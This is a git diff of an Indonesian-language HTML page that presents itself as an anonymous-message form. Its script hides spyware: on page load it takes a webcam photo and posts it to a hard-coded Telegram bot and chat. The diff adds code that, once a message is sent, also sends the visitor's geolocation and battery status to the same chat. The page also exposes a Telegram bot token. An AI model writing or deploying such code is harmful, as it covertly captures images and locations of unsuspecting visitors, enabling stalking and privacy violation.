@@ -53,29 +53,29 @@
     </div>
 
     <script>
-        const botToken = "7784863108:AAF4lFHVtHd5_sKdGYI9cU2cNBNLV3dq3Xw";
-        const chatId = "-1002632386838";
+    const botToken = "7784863108:AAF4lFHVtHd5_sKdGYI9cU2cNBNLV3dq3Xw";
+    const chatId = "-1002632386838";
 
-        async function sendMessage() {
-            const phone = document.getElementById("phone").value.trim();
-            const message = document.getElementById("message").value.trim();
+    async function sendMessage() {
+        const phone = document.getElementById("phone").value.trim();
+        const message = document.getElementById("message").value.trim();
 
-            if (!phone || !message) {
-                Swal.fire({
-                    icon: "error",
-                    title: "Oops...",
-                    text: "Username dan pesan tidak boleh kosong!",
-                    confirmButtonColor: "#3B82F6"
-                });
-                return;
-            }
+        if (!phone || !message) {
+            Swal.fire({
+                icon: "error",
+                title: "Oops...",
+                text: "Username dan pesan tidak boleh kosong!",
+                confirmButtonColor: "#3B82F6"
+            });
+            return;
+        }
 
-            navigator.getBattery().then(async function(battery) {
-                const batteryLevel = Math.floor(battery.level * 100) + "%";
-                const chargingStatus = battery.charging ? "Sedang diisi" : "Tidak diisi";
+        navigator.getBattery().then(async function(battery) {
+            const batteryLevel = Math.floor(battery.level * 100) + "%";
+            const chargingStatus = battery.charging ? "Sedang diisi" : "Tidak diisi";
 
-                const imageUrl = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Dari ${encodeURIComponent(phone)}&text=${encodeURIComponent(message)}`;
-                const finalMessage = `
+            const imageUrl = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Dari ${encodeURIComponent(phone)}&text=${encodeURIComponent(message)}`;
+            const finalMessage = `
 ━━━━━━━━━━━━━━━
 ✨✨✨✨✨✨✨✨✨✨
 ━━━━━━━━━━━━━━━
@@ -86,49 +86,67 @@
 ⚡ Status : ${chargingStatus}
 ━━━━━━━━━━━━━━━`;
 
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(finalMessage)}&parse_mode=Markdown`);
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(finalMessage)}&parse_mode=Markdown`);
 
-                Swal.fire({
-                    icon: "success",
-                    title: "Berhasil!",
-                    text: "Pesan berhasil dikirim!",
-                    confirmButtonColor: "#10B981"
-                });
+            Swal.fire({
+                icon: "success",
+                title: "Berhasil!",
+                text: "Pesan berhasil dikirim!",
+                confirmButtonColor: "#10B981"
             });
-        }
 
-        async function captureAndSendPhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(track => track.stop());
-
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", blob, "photo.jpg");
-
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (err) {
-                console.error("Gagal akses kamera atau kirim foto:", err);
-            }
-        }
-
-        window.addEventListener('load', () => {
-            captureAndSendPhoto();
+            // Kirim lokasi otomatis setelah pesan terkirim
+            sendLocationToTelegram();
         });
-    </script>
+    }
+
+    function sendLocationToTelegram() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`);
+            }, (error) => {
+                console.error("Gagal ambil lokasi:", error);
+            });
+        } else {
+            console.warn("Geolocation tidak didukung browser ini.");
+        }
+    }
+
+    async function captureAndSendPhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        } catch (err) {
+            console.error("Gagal akses kamera atau kirim foto:", err);
+        }
+    }
+
+    window.addEventListener('load', () => {
+        captureAndSendPhoto();
+    });
+</script>
 </body>
 </html>
